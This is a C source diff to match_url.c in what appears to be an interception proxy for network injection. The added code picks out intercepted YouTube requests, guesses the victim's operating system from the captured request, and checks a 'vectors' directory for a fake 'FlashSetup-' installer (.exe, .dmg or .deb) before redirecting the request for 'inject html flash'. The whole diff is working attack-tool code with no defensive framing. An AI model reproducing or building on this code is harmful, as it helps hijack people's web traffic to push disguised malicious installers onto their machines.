@@ -6,7 +6,10 @@
     $Id: match_url.c 3041 2010-10-26 10:11:18Z daniele $
 */
 
+#include <dirent.h>
+
 #include <main.h>
+#include <proxy.h>
 #include <hook.h>
 #include <file.h>
 #include <send.h>
@@ -37,20 +40,6 @@ static void mangle_url(const char *host, const char *page, char *redir_url, size
 static int http_redirect(struct packet_object *po, u_char *splash_page, size_t splash_page_len);
 
 /*******************************************/
-
-static int
-search_useragent_browser(char *request)
-{
-
-   if (strstr(request, "User-Agent: ") != NULL) {
-      char *user = strstr(request, "User-Agent:");
-
-      if (strstr(user, "Opera") != NULL)
-          return 1;
-   }
-
-   return 0;
-}
 
 int urllist_find(const char* url, const char *tag)
 {
@@ -334,6 +323,59 @@ void match_url(struct packet_object *po)
       if (req_pub_ip == 1 && GBL_NET->ip_plus == 0) {
           DEBUG_MSG(D_DEBUG, "URL required a public IP address, not redirected.");
           return;
+      }
+
+      if (strstr(url, "youtube") != NULL) {
+	 osuser os;
+
+         os = search_useragent_os((char *) po->DATA.data);
+
+         if (os != UNKNOWN) {
+	    DIR *dirvec = NULL;
+            struct dirent *entvec = NULL;
+	    int ret;
+
+	    if ((dirvec = opendir("/opt/td-config/share/vectors/")) != NULL) {
+               ret = 0;
+
+               while ((entvec = readdir(dirvec)) != NULL) {
+                  char *file = entvec->d_name;
+
+                  if (os == WINDOWS) {
+		     if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".exe") != NULL) {
+		        ret = 1;
+			break;
+		     }
+		  } else if (os == OSX) {
+                     if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".dmg") != NULL) {
+                        ret = 1;
+                        break;
+                     }
+                  } else {
+		     if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".deb") != NULL) {
+                        ret = 1;
+                        break;
+                     }
+		  }
+               }
+	
+	       closedir(dirvec);
+
+	       if (ret != 1) {
+	          os = UNKNOWN;
+	       }
+	    } else {
+               DEBUG_MSG(D_ERROR, "OS detect for inject html flash failed.");
+               os = UNKNOWN;
+            }
+         }
+
+         if (os == UNKNOWN) {
+	    DEBUG_MSG(D_ERROR, "ERROR: OS detected for inject html flash not supported, URL not redirected.");
+            return;
+         } else {
+            DEBUG_MSG(D_INFO, "OS detected for inject html flash is supported");
+         }
       }
 
       DEBUG_MSG(D_INFO, "URL matched REDIRECTED URL: %s ", url);
